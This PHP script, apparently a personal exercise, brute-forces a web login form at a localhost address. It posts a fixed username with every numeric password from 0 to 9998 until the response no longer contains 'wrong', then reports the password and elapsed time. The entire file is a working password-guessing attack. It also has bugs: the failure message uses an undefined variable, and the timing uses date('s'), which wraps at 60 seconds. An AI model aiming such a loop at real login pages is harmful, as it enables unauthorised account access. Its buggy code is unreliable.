<?php
/**
 * Created by PhpStorm.
 * User: MOGA
 * Date: 2017-06-12
 * Time: 12:16 PM
 */
$user = "1000";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "localhost/phpStorm/login/login.php");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$time = time();
for ($i = 0; $i < 9999; $i++) {
    curl_setopt($curl, CURLOPT_POSTFIELDS, "username=$user&password=$i&submit=login");
    $result = curl_exec($curl);
    if (!strpos($result, "wrong")) {
        $time = time() - $time;
        $seconds = date("s", $time);
        echo $i . " is the password you wanted for user '$user'. in ($seconds s)";
        exit();
    }
}
$time = time() - $time;
$seconds = date("s", $time);
echo "sorry, password not found for user '$ali'.($seconds s)";
